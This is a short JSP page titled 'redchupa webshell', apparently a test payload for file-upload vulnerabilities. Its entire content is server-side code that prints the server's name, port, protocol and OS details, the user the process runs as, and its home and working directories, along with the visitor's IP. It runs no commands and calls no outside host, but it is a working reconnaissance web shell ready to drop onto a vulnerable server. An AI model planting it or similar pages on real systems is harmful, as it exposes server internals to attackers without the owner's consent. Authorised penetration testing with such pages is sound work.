<%@ page language="java" contentType="text/html; charset=euc_kr"%>

<html>
	<head>
		<title>redchupa webshell</title>
	</head>
	
	<body>
		TEST PC IP ADDRESS : "<%=request.getRemoteAddr()%>"
		server name : "<%=request.getServerName()%>"
		server port : "<%=request.getServerPort()%>"
		OS : "<%=System.getProperty("os.name") + " " + System.getProperty("os.version") + " " + System.getProperty("os.arch")%>"
		server user name : "<%=System.getProperty("user.name")%>"
		server home dir : "<%=System.getProperty("user.home")%>"
		server file path : "<%=System.getProperty("user.dir")%>"
		Network Protocols : "<%=request.getProtocol()%>"
	</body>
</html>